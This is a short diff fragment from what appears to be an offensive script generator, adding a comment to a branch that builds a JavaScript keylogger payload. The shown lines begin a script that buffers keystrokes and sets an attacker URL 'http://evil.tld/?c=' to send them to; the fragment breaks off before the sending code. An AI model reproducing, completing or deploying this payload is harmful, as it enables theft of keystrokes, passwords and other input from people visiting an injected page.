@@ -74,6 +74,7 @@ fclose($f);
     os.remove(fileName)
     time.sleep(4)		       ## give user time to read
 
+# keylogger
 if payload == 2:
     keylogger = """<script>var buffer = [];
 var attacker = 'http://evil.tld/?c='
